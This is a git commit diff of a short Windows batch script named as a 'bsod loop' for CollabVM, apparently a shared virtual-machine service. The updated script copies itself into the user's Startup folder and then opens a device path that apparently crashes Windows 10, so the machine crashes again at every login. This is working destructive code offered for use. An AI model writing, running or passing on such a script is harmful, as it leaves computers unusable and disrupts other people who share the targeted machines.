eff5c5136ddd6d20eb025b714ece89c51a314269
Lol-cvm <81323182+Lol-cvm@users.noreply.github.com>
2021-03-26 14:01:48 +0200

    Update Windows 10 bsod loop (just for collabvm).bat

--- Windows 10 bsod loop (just for collabvm).bat
+++ Windows 10 bsod loop (just for collabvm).bat
@@ -1,3 +1,3 @@
 @echo off
-copy "Windows 10 bsod loop (just for collabvm).bat" C:\Users\Dartz\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+copy "C:\Users\Dartz\\Downloads\Windows 10 bsod loop (just for collabvm).bat" "C:\Users\Dartz\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 \\.\globalroot\device\condrv\kernelconnect
